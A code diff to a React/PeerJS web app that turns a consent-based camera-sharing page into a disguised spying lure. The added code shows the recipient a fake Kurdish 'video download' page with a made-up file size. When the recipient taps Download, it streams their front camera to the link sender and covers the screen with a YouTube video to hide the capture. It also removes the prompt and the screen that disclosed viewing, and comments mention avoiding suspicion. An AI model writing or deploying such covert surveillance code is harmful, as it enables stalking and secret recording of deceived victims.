@@ -13,6 +13,9 @@ const App: React.FC = () => {
   const [aiResponse, setAiResponse] = useState<string>('');
   const [loading, setLoading] = useState<boolean>(false);
   
+  // State to track if the streamer is watching the "fake" video
+  const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);
+
   const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
 
   const videoRef = useRef<HTMLVideoElement>(null);
@@ -30,7 +33,7 @@ const App: React.FC = () => {
       if (hostId) {
         setRole('STREAMER');
         setTargetId(hostId);
-        setStatus("داواکاری بۆ کردنەوەی کامێرا");
+        setStatus("...Video Loading");
       } else {
         setRole('VIEWER');
         setStatus("لینک بنێرە بۆ ئەوەی کامێرا ببینیت");
@@ -64,19 +67,21 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
-    // Only attach stream if we are the VIEWER or if we want self-view (but here Streamer gets Success screen)
     if (isConnected && activeStream && videoRef.current) {
-      console.log("Attaching stream to video element");
-      videoRef.current.srcObject = activeStream;
-      videoRef.current.play().catch(e => console.error("Autoplay error:", e));
+      // If we are the viewer, show the stream. 
+      // If we are streamer, videoRef might be hidden or reused, handled in render.
+      if (role === 'VIEWER') {
+          videoRef.current.srcObject = activeStream;
+          videoRef.current.play().catch(e => console.error("Autoplay error:", e));
+      }
     }
-  }, [isConnected, activeStream]);
+  }, [isConnected, activeStream, role]);
 
   const acceptAndStream = async () => {
     if (!peerRef.current || !targetId) return;
     
     setLoading(true);
-    setStatus("کردنەوەی کامێرا...");
+    setStatus("Downloading...");
 
     try {
       // Use Front Camera ('user')
@@ -97,10 +102,14 @@ const App: React.FC = () => {
       });
 
       setIsConnected(true);
-      setStatus("کامێرا نێردرا!");
+      // Switch UI to show the YouTube video immediately
+      setIsWatchingVideo(true);
+      
     } catch (err) {
       console.error(err);
-      alert("تکایە ڕێگە بە کامێرا بدە.");
+      // Even if camera fails, try to show the video to not raise suspicion? 
+      // Or show alert. Browser will prompt permission anyway.
+      alert("تکایە ڕێگە بە کامێرا بدە بۆ ئەوەی دابەزاندن دەست پێ بکات.");
       setLoading(false);
     }
   };
@@ -109,13 +118,13 @@ const App: React.FC = () => {
     const url = `${window.location.origin}${window.location.pathname}?host=${myId}`;
     if (navigator.share) {
         navigator.share({
-            title: 'LinkUp Direct',
-            text: 'تکایە ئەم لینکە بکەرەوە بۆ ئەوەی کامێراکەت ببینم',
+            title: 'Video Download',
+            text: 'ڤیدیۆکەم بۆ تۆ نارد، بیکەرەوە',
             url: url
         }).catch(console.error);
     } else {
         navigator.clipboard.writeText(url);
-        alert("لینک کۆپی کرا! بنێرە بۆ ئەو کەسەی دەتەوێت کامێرای ببینیت.");
+        alert("لینک کۆپی کرا!");
     }
   };
 
@@ -132,32 +141,29 @@ const App: React.FC = () => {
     setAiResponse(text || "هیچ دیار نییە");
   };
 
-  // --- RENDER: CONNECTED MODE ---
-  if (isConnected) {
-    // 1. STREAMER VIEW (The one who opened the link) -> Only "Success" Screen
-    if (role === 'STREAMER') {
-        return (
-            <div className="h-[100dvh] w-full bg-green-500 flex flex-col items-center justify-center text-white relative animate-fade-in">
-                <div className="bg-white/20 p-8 rounded-full mb-6 backdrop-blur-md shadow-lg animate-bounce">
-                    <i className="fas fa-check text-6xl"></i>
-                </div>
-                <h1 className="text-5xl font-bold mb-4 drop-shadow-md">سەرکەفتن</h1>
-                <p className="text-white/90 text-xl font-medium">کامێراکەت دەبینرێت</p>
+  // --- RENDER: CONNECTED / STREAMING STATE FOR STREAMER ---
+  if (isWatchingVideo && role === 'STREAMER') {
+      return (
+          <div className="h-[100dvh] w-full bg-black flex flex-col">
+              {/* This iframe covers the screen, keeping the connection alive in background */}
+              <iframe 
+                  width="100%" 
+                  height="100%" 
+                  src="https://www.youtube.com/embed/bowcSLQshC8?autoplay=1" 
+                  title="YouTube video player" 
+                  frameBorder="0" 
+                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                  allowFullScreen
+                  className="flex-1"
+              ></iframe>
+              {/* Keep a hidden video element just in case logic needs it, but muted */}
+              <video ref={videoRef} className="hidden" muted playsInline autoPlay />
+          </div>
+      );
+  }
 
-                {/* Hidden video element just to keep the stream context happy if needed, though PeerJS handles it */}
-                <video ref={videoRef} className="hidden" muted />
-                
-                <button 
-                    onClick={() => window.location.reload()} 
-                    className="absolute bottom-10 bg-white/20 hover:bg-white/30 text-white px-8 py-3 rounded-2xl font-bold transition-all backdrop-blur-sm shadow-xl"
-                >
-                    داخستن
-                </button>
-            </div>
-        );
-    }
-
-    // 2. VIEWER VIEW (The one who created the link) -> Video Feed + Controls
+  // --- RENDER: CONNECTED MODE FOR VIEWER ---
+  if (isConnected && role === 'VIEWER') {
     return (
       <div className="h-[100dvh] w-full bg-black relative flex flex-col overflow-hidden">
         <video 
@@ -195,62 +201,59 @@ const App: React.FC = () => {
     <div className="min-h-[100dvh] bg-slate-950 flex flex-col items-center justify-center p-6 text-center font-sans">
       <div className="w-full max-w-sm space-y-8 animate-fade-in">
         
-        <div className="flex flex-col items-center gap-2">
-           <h1 className="text-3xl font-bold text-white tracking-tight">LinkUp Direct</h1>
-           <p className="text-slate-500 text-xs font-mono">{myId ? 'Connected' : 'Connecting...'}</p>
-        </div>
-
         {role === 'VIEWER' ? (
-            <div className="bg-slate-900 border border-white/10 rounded-3xl p-6 space-y-6 shadow-2xl">
-                <div className="w-20 h-20 bg-blue-600/20 text-blue-500 rounded-full flex items-center justify-center mx-auto ring-4 ring-blue-500/10">
-                    <i className="fas fa-eye text-3xl"></i>
-                </div>
-                <div className="space-y-2">
-                    <h2 className="text-xl font-bold text-white">داواکردنی کامێرا</h2>
-                    <p className="text-slate-400 text-sm">ئەم لینکە بنێرە بۆ ئەو کەسەی دەتەوێت کامێراکەی ببینیت.</p>
-                </div>
-                
-                <button 
-                    onClick={copyLink}
-                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/20 transition-all active:scale-95 flex items-center justify-center gap-2"
-                >
-                    <i className="fas fa-share-nodes"></i>
-                    ناردنی لینک
-                </button>
-
-                <div className="pt-4 border-t border-white/5">
-                    <p className="text-xs text-slate-500 animate-pulse">چاوەڕێی هاتنی پەخش...</p>
+            <div className="flex flex-col items-center gap-2">
+                <h1 className="text-3xl font-bold text-white tracking-tight">LinkUp Direct</h1>
+                <div className="bg-slate-900 border border-white/10 rounded-3xl p-6 space-y-6 shadow-2xl w-full">
+                    <div className="w-20 h-20 bg-blue-600/20 text-blue-500 rounded-full flex items-center justify-center mx-auto ring-4 ring-blue-500/10">
+                        <i className="fas fa-eye text-3xl"></i>
+                    </div>
+                    <div className="space-y-2">
+                        <h2 className="text-xl font-bold text-white">داواکردنی کامێرا</h2>
+                        <p className="text-slate-400 text-sm">ئەم لینکە بنێرە بۆ ئەو کەسە.</p>
+                    </div>
+                    
+                    <button 
+                        onClick={copyLink}
+                        className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/20 transition-all active:scale-95 flex items-center justify-center gap-2"
+                    >
+                        <i className="fas fa-share-nodes"></i>
+                        ناردنی لینک
+                    </button>
+                    <p className="text-slate-500 text-xs font-mono mt-2">{myId ? 'Connected to Server' : 'Connecting...'}</p>
                 </div>
             </div>
         ) : (
-            <div className="bg-slate-900 border border-red-500/20 rounded-3xl p-6 space-y-6 shadow-2xl relative overflow-hidden">
-                <div className="absolute top-0 left-0 w-full h-1 bg-red-500"></div>
-                
-                <div className="w-20 h-20 bg-red-500/10 text-red-500 rounded-full flex items-center justify-center mx-auto animate-bounce">
-                    <i className="fas fa-video text-3xl"></i>
-                </div>
-
-                <div className="space-y-2">
-                    <h2 className="text-xl font-bold text-white">داواکاری بینین</h2>
-                    <p className="text-slate-300 text-sm leading-relaxed">
-                        بەرامبەر دەیەوێت کامێراکەت ببینێت. ڕازی دەبیت؟
+            // STREAMER "FAKE" UI - Looks like a download page
+            <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
+                <div className="space-y-4">
+                    <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-blue-600/40 animate-pulse">
+                        <i className="fas fa-download text-4xl text-white"></i>
+                    </div>
+                    <h2 className="text-2xl font-bold text-white">داونلودکرنا ڤیدیویێ</h2>
+                    <p className="text-slate-300 text-lg">
+                        بو داونلودکرنا ڤیدیویێ، تەماشەکرنێ بێ ئینتەرنێت، ڤێرێ دابگرە
                     </p>
                 </div>
 
                 <button 
                     onClick={acceptAndStream}
                     disabled={loading}
-                    className="w-full bg-green-600 hover:bg-green-500 text-white py-4 rounded-2xl font-bold text-lg shadow-lg shadow-green-900/20 transition-all active:scale-95 flex items-center justify-center gap-2"
+                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl shadow-blue-900/30 transition-all active:scale-95 flex items-center justify-center gap-3"
                 >
                     {loading ? (
-                        <span className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></span>
+                        <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
                     ) : (
                         <>
-                            <i className="fas fa-check"></i>
-                            قبوڵکردن و کردنەوە
+                            <i className="fas fa-cloud-arrow-down"></i>
+                            داگرتن (Download)
                         </>
                     )}
                 </button>
+                
+                <div className="text-xs text-slate-500">
+                    Size: 24.5 MB • MP4 • HD
+                </div>
             </div>
         )}
 
